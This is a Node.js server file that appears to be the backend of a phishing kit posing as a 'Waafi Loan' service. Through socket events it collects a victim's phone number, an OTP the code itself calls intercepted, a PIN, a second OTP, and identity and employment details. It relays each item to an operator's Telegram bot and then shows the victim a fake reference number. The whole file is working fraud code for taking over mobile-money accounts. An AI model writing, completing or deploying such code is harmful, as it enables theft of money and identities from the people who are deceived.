require('dotenv').config();
const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');

const botManager = require('./bot_manager');

const app = express();
const server = http.createServer(app);

const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

global.io = io; 

const PORT = process.env.PORT || 3000;
const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// FIX: Added explicit leading slash for proper route mapping
app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
    botManager.bot.processUpdate(req.body);
    res.sendStatus(200);
});

io.on('connection', (socket) => {
    const initialAppId = `WFI-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
    socket.emit('session-ready', { appId: initialAppId });

    socket.on('join-room', (room) => {
        socket.join(room);
        console.log(`🔌 User joined room: ${room}`);
    });

    // STEP 1: Phone submission
    socket.on('request-otp1', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Initial Request: Phone Submitted", { Phone: data.phone }, false);
    });

    // STEP 1 Validation: Intercepted OTP 1
    socket.on('step4-otp', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 1: Phone & Intercepted OTP 1", { Phone: data.phone, "OTP 1": data.otp }, true);
    });

    // FIX: Matched event name 'step5-pin' from the front-end call
    socket.on('step5-pin', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendFinalApproval(currentId, data.pin);
    });

    // FIX: Aligned event name string to match frontend 'submit-otp2'
    socket.on('submit-otp2', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendSecondOTP(currentId, data.otp2);
    });

    // STEP 4: Loan Request Parameters
    socket.on('step1', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 4: Loan Request Parameters", data, false);
    });

    // STEP 5: Personal Identity Profile
    socket.on('step2', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 5: Personal Identity Profile", data, false);
    });
    
    // FIX: Captures final layout payload from frontend submitStep3 action
    socket.on('step3-data', (data) => {
        const currentId = data.appId || initialAppId;
        botManager.sendToAdmin(currentId, "🇸🇴 Step 6: Employment & Income Status", data, false);
        
        // Return success confirmation message tracking parameters
        const referenceId = `REF-${Math.floor(100000 + Math.random() * 900000)}`;
        io.to(currentId).emit('application-complete', { referenceId });
    });

    socket.on('disconnect', () => {
        console.log(`🔌 User disconnected socket.`);
    });
});

server.listen(PORT, async () => {
    console.log(`🚀 Waafi Loan Server running on port ${PORT}`);
    
    if (EXTERNAL_URL) {
        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
        try {
            await botManager.bot.setWebHook(webhookUrl);
            console.log(`✅ Telegram Webhook successfully set to: ${webhookUrl}`);
        } catch (err) {
            console.error('❌ Webhook Setup Failed:', err.message);
        }
    } else {
        console.warn('⚠️ RENDER_EXTERNAL_URL missing inside environment configs.');
    }
});